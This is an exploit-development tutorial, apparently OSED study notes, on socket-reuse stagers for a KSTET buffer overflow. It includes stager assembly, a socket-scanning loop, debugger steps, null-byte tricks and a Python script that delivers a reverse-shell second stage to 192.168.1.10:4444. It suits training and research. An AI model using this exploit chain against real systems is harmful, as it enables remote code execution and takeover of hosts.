# Socket-Reuse Stagers

When your shellcode won't fit, borrow the connection that's already there. A guide to the technique, the assembly, and the reasoning behind each instruction.

---

## The Problem Stagers Solve

A buffer overflow gives you control of EIP, but the buffer that got you there has a fixed size. Some overflows leave hundreds of bytes for shellcode. Others leave almost nothing.

**KSTET example:** 70 bytes before EIP. ~20 bytes after EIP. A reverse shell needs 350-500 bytes. It simply does not fit.

A stager is a tiny first-stage payload that fits in the available space. Its only job: receive the real shellcode over the network and jump to it.

---

## Two Kinds of Stager

**New Connection Stager**

Creates a fresh socket, connects back to you, and downloads stage 2.

- **Requires:** WSAStartup, WSASocketA, connect, recv, VirtualAlloc -- many API calls
- **Size:** ~200-300 bytes. Too large for tight buffers
- **This is what the emitter's `tcp_stager` template does**

**Socket-Reuse Stager**

Reuses a socket the vulnerable application already has open -- the same connection your exploit arrived on.

- **Requires:** One call to `recv()`. That's it
- **Size:** ~40-60 bytes. Fits in tight buffers
- No new libraries, no new connections, no firewall issues

---

## When to Choose Each Approach

| Constraint | Socket-Reuse | New Connection | No Stager |
|---|---|---|---|
| Available buffer space | 40-70 bytes | 200-300 bytes | 400+ bytes |
| Network restrictions | Works -- no new connections | Needs outbound access | Depends on payload |
| Socket descriptor known? | Must be findable | Not needed | N/A |
| Reliability | Depends on descriptor location | High | Highest |

If you have enough space for full shellcode, don't use a stager. If you have 200+ bytes but not enough for a full payload, use a new-connection stager (the emitter's `tcp_stager`). If you have under ~100 bytes, socket reuse is your option.

---

## How Socket Reuse Works

Every networked application that accepted your connection has a socket descriptor -- an integer handle to the TCP connection. When the application calls `recv()` or `send()`, it passes this descriptor as the first argument. Your stager reuses that same descriptor to call `recv()` one more time, pulling in your real shellcode.

```
  Attacker                          Vulnerable App
  --------                          --------------
     |                                    |
     |  1. Normal connection              |
     |----------------------------------->|  socket descriptor = 0x2ac
     |                                    |
     |  2. Exploit payload (stage 1)      |
     |----------------------------------->|  overflow -> EIP control
     |                                    |
     |                                    |  stager executes:
     |                                    |    recv(0x2ac, buf, 512, 0)
     |                                    |
     |  3. Stage 2 shellcode              |
     |----------------------------------->|  lands in buf
     |                                    |
     |                                    |  jmp buf -> full payload runs
     |                                    |
```

The critical insight: your exploit and your stage 2 travel over the **same TCP connection**. The application already called `recv()` to read your exploit. Your stager calls `recv()` again on that same socket, and whatever you send next becomes stage 2.

---

## Finding the Socket Descriptor

The descriptor value (e.g. `0x2ac`) changes on every restart. You can't hardcode it. You need to find *where* it lives at the moment you gain control, and that location must be reliable across runs.

### Step 1: Capture the Value

Set a breakpoint on a Winsock function and grab the descriptor from the stack:

```
; Break on send or recv
bp ws2_32!send
g

; When it breaks, first arg is the socket (stdcall: [esp+4])
dd esp+4 L1
; Output: 01faf9c8  000002ac
```

### Step 2: Verify It

```
!handle 2ac f
; Should show: Type = File, GrantedAccess includes Read/Write/Synch
; Sockets appear as \Device\Afd file objects on Windows
```

### Step 3: Find Where It Lives at Crash Time

Trigger the overflow and examine the register state:

```
eax=01faf978  ebx=000002ac  ecx=001854a4  edx=00000000
esi=00401848  edi=00401848
eip=41414141  esp=01faf9c8  ebp=41414141
```

Here, `ebx` holds `0x2ac` -- the socket descriptor. This happens because `ebx` is a **callee-saved register**. The thread function stored the socket in `ebx` early on, and the overflow trashed `ebp` and `eip` but left `ebx` untouched.

### Three Places to Find It

| Location | Reliability | How to Use |
|---|---|---|
| **Register** (e.g. `ebx`) | Best -- if consistent across runs | `push ebx` directly |
| **Stack offset** from `esp` | Good -- depends on frame layout | `mov eax, [esp+N]` |
| **Global variable** in `.data` | Fixed address, but rare in threaded servers | `mov eax, [0x00XXXXXX]` |

The descriptor value changes between runs, but the *location* (which register or stack offset) should stay the same. Restart the application and crash it again. If `ebx` still holds the socket (whatever new value it has), you can trust it. If it doesn't, you need a different approach.

### Fallback: Socket Scanning

When no register or fixed location reliably holds the descriptor, you can scan for it at runtime. Loop through handle values and call `getpeername()` on each -- when it succeeds, you've found a connected socket:

```asm
scan_loop:
    xor  ebx, ebx
next_sock:
    inc  ebx               ; try next handle value
    push esp               ; &namelen (reuse stack)
    push esp               ; &sockaddr (reuse stack)
    push ebx               ; candidate socket
    call getpeername
    test eax, eax
    jnz  next_sock         ; failed -- not a connected socket
    ; ebx now holds the active socket descriptor
```

This adds ~30 bytes but works regardless of the descriptor value. It's the standard approach when registers and stack analysis come up empty.

---

## Building the Stager Assembly

This is the core of it: a tiny program that calls `recv(socket, buffer, length, 0)` and jumps to what it received. Every instruction exists for a reason.

### The Complete Stager (ebx holds socket)

```asm
; ============================================
; Socket-reuse stager
; Precondition: ebx = socket descriptor
; ============================================

; --- clear the deck ---
sub  esp, 0x64          ; (1) make room so recv buffer
                        ;     doesn't overwrite our stager

; --- push recv() args in reverse (stdcall) ---

; arg 4: flags = 0
xor  eax, eax           ; (2) eax = 0
push eax                ; (3) flags = 0

; arg 3: len = 512
mov  ah, 0x02            ; (4) eax = 0x0200 = 512
push eax                ; (5) len = 512

; arg 2: buf = esp + 0x64
push esp                ; (6) get current esp
pop  eax                ; (7) eax = esp
add  al, 0x64            ; (8) point past our stager code
push eax                ; (9) buf = address for stage 2
mov  esi, eax           ; (10) save buf addr for later jmp

; arg 1: socket descriptor
push ebx                ; (11) socket -- already in ebx

; --- call recv ---
mov  eax, 0x0040252cFF  ; (12) recv addr with junk suffix
shr  eax, 0x08           ; (13) shift right 8 -> 0x0040252c
call eax                ; (14) recv(socket, buf, 512, 0)

; --- jump to stage 2 ---
jmp  esi                ; (15) execute received shellcode
```

### Why Each Instruction is There

**1. `sub esp, 0x64` -- Protect the stager**

The `recv()` call will push data onto the stack internally. If `esp` is pointing near our stager code, those pushes could overwrite instructions we haven't executed yet. Subtracting from `esp` moves the stack pointer down, creating a safety gap.

**2. `xor eax, eax` -- Zero without null bytes**

`mov eax, 0` would work but encodes as `B8 00 00 00 00` -- four null bytes. `xor eax, eax` encodes as `31 C0` -- two bytes, no nulls. This is the standard way to zero a register in shellcode.

**3. `push eax` -- Flags parameter**

`recv()` takes four arguments. In x86 stdcall, arguments are pushed right to left. Flags (the last parameter) goes first. We want 0, and `eax` is already 0.

**4. `mov ah, 0x02` -- Length = 512 without nulls**

We need `eax = 0x00000200` (512 decimal). Writing `mov eax, 0x200` produces `B8 00 02 00 00` -- null bytes. Instead: `eax` is already 0 from the `xor`, so `mov ah, 0x02` sets the upper byte of `ax`, giving us `0x0200` in just two bytes of opcode: `B4 02`.

```
eax after xor:   00 00 00 00
                       ^^
                       ah
mov ah, 0x02:    00 00 02 00
                 = 0x200 = 512
```

**5. `push esp / pop eax / add al, 0x64` -- Build the buffer address**

Stage 2 needs somewhere to land. We use the stack itself, but offset forward so it doesn't collide with our stager. `push esp; pop eax` is equivalent to `mov eax, esp` but one byte shorter. Adding `0x64` to `al` (not `eax`) avoids null bytes -- `add eax, 0x64` would encode with three zero padding bytes.

**6. `mov esi, eax` -- Save the landing address**

After `recv()` returns, we need to jump to where stage 2 was placed. But `recv()` will clobber `eax` (return value = bytes received). So we save the buffer address in `esi`, a callee-saved register that `recv()` will preserve.

**7. `push ebx` -- The socket descriptor**

This is where socket reuse pays off. The application's socket descriptor is already sitting in `ebx`. One instruction. Compare this to a new-connection stager that needs WSAStartup + WSASocketA + connect just to get a descriptor.

**8. `mov eax, 0x0040252cFF / shr eax, 0x08` -- Call address without nulls**

The `recv` function lives at `0x0040252c` -- but that address starts with `00`, a null byte. We can't embed it directly.

The trick: append a junk byte (`FF`) to shift the address left by 8 bits, making it `0x40252cFF`. Then `shr eax, 8` shifts right, pushing a `00` back in from the top and discarding the `FF`. The result is the original `0x0040252c`, and no null byte appeared in the shellcode.

```
mov eax, 0x40252cFF    eax = 40 25 2c FF
shr eax, 0x08          eax = 00 40 25 2c   (the real address)
```

**9. `jmp esi` -- Execute stage 2**

After `recv()` returns, the full shellcode is sitting at the address we saved in `esi`. Jump there and it executes -- reverse shell, calc pop, whatever you sent as stage 2.

---

## Assembly Tricks Reference

These patterns come up repeatedly in shellcode. They exist because certain byte values can't appear in the encoded shellcode -- the target application will mangle or truncate them.

| Goal | Naive Way (has nulls) | Shellcode Way (clean) | Encoding |
|---|---|---|---|
| Zero a register | `mov eax, 0` | `xor eax, eax` | 31 C0 |
| Set eax = 512 | `mov eax, 0x200` | `xor eax, eax` then `mov ah, 2` | 31 C0, B4 02 |
| Copy esp to eax | `mov eax, esp` | `push esp; pop eax` | 54, 58 |
| Add small value | `add eax, 0x64` | `add al, 0x64` | 04 64 |
| Address with leading 00 | `mov eax, 0x0040252c` | `mov eax, 0x40252cFF` then `shr eax, 8` | B8 FF 2C 25 40, C1 E8 08 |
| Push 0 | `push 0` | `xor eax, eax; push eax` | 31 C0, 50 |

Every trick follows the same logic: achieve the value you need without any forbidden bytes appearing in the machine code encoding. The most common badchars are `0x00` (null -- terminates C strings), `0x0a` (linefeed), `0x0d` (carriage return), and `0x3b` (semicolon). The emitter's `encode.py` automates these transformations.

---

## The Full Exploit Layout

For the KSTET overflow with 70 bytes before EIP and ~20 bytes after:

```
|-- prefix --|------ 70 bytes ------|-- 4 bytes --|--- ~20 bytes ---|
|   "KSTET " |  NOP sled + stager   |  jmp esp    |  short jmp -74  |
|            |  (recv + jmp)         |  (EIP)      |  (back to sled) |
|            |                       |             |                  |
|            |  Stage 1 executes     |  CPU lands  |  CPU starts     |
|            |  here (step 3)        |  here       |  here (step 1)  |
|            |                       |  (step 2)   |                  |
```

Execution flow:

1. Overflow hits. CPU jumps to `41414141` -- but we replaced that with a `jmp esp` gadget address
2. CPU follows `jmp esp`, landing in the ~20 bytes after EIP
3. Those 20 bytes contain a short backward jump: `jmp short -74` (back 70 bytes + 4 for EIP)
4. CPU lands at the start of our 70-byte buffer where the stager lives
5. Stager calls `recv()`, stage 2 arrives, `jmp esi` runs it

---

## Can the Emitter Be a Socket-Reuse Stager?

Short answer: **not today, but it could be.**

The emitter's existing `tcp_stager` template creates a new outbound socket. That's a fundamentally different approach:

| | Emitter `tcp_stager` | Socket-Reuse Stager |
|---|---|---|
| **Socket source** | Creates new (WSAStartup + WSASocketA + connect) | Reuses existing descriptor |
| **APIs needed** | 7 (LoadLibraryA, WSAStartup, WSASocketA, connect, recv, closesocket, VirtualAlloc) | 1 (recv -- at a known address) |
| **PEB walk needed** | Yes -- must resolve API addresses | No -- calls recv at a static address from the loaded module |
| **Output size** | ~300+ bytes | ~40-60 bytes |
| **Target-specific** | No -- works anywhere | Yes -- needs recv address + socket location from the specific binary |

A socket-reuse stager is almost entirely handcrafted to the target. It doesn't use the PEB walk, doesn't resolve APIs through the export table, and doesn't allocate a stack frame. It's closer to a hand-written assembly snippet than something the emitter's architecture (manifest -> layout -> template) is designed for.

### What it Would Take

To add socket-reuse support to the emitter, you'd need a new template type that:

- Skips the PEB walk and API resolution entirely (the emitter's biggest code section)
- Accepts target-specific parameters: `recv` address, socket descriptor source (register name, stack offset, or memory address)
- Emits a minimal stub -- just the `recv` call setup and the jump to stage 2
- Handles the recv address's null bytes with the `shr` trick or similar

It's a fundamentally different code path from everything the emitter currently generates. Whether it belongs in the emitter or stays as a hand-built exploit component is a design question -- the value of the emitter is automating the *repeatable* parts of shellcode, and a socket-reuse stager has a lot of per-target manual analysis baked into it.

For OSED exam purposes, you're better off understanding how to hand-build this stager. The assembly is small enough that automation doesn't save much time, and the WinDbg analysis to find the socket descriptor is the real work. The emitter shines for the larger payloads (reverse shell, tcp_download) that become stage 2.

---

## The Two-Stage Chain in Practice

Here's how the pieces fit together for a real exploit:

```python
# 1. Hand-build the socket-reuse stager (stage 1)
#    - analyze target in WinDbg to find socket descriptor location
#    - find recv() address in the loaded modules
#    - write the ~50 byte stager assembly
#    - encode with msf_nasm_shell or keystone

# 2. Build stage 2 with the emitter
# uv run -m Tools.emitter Tools/emitter/manifests/revshell.yaml \
#     --template reverse_shell --lhost 192.168.1.10 --lport 4444 \
#     --out emitter_out/stage2/

# 3. Exploit script sends stage 1, sleeps briefly, then sends
#    the stage 2 .bin over the same connection
import socket, time

s = socket.socket()
s.connect((target, port))

# stage 1 in the overflow buffer
payload = prefix + nops + stager + eip + jmp_back
s.send(payload)

# small delay for stager to start recv()
time.sleep(0.5)

# stage 2 over the same socket
with open("emitter_out/stage2/bin/shellcode.bin", "rb") as f:
    s.send(f.read())
```
